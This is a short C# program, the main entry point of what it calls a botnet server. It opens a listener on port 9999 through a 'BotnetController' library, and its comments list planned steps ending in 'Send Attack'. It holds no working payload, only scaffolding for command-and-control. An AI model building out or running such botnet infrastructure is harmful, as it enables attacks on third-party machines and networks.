using BotnetController;
using System;
using System.Net;
using System.Threading;

namespace BotNetServer
{
	internal class Program
	{
		static void Main(string[] args)
		{
			IPAddress ip = IPAddress.Parse("0.0.0.0");
			Botnet.ServerConnection Cn = new Botnet.ServerConnection(ip, 9999);


			Console.WriteLine("Botnet Server");

			Console.WriteLine("Connecting...");
			Cn.Connect();


			Console.WriteLine("Listening....");

			while (true)
				Thread.Sleep(-1);
			//Connect to server
			//Handle
			//Pinging
			//Send Attack
		}
	}
}
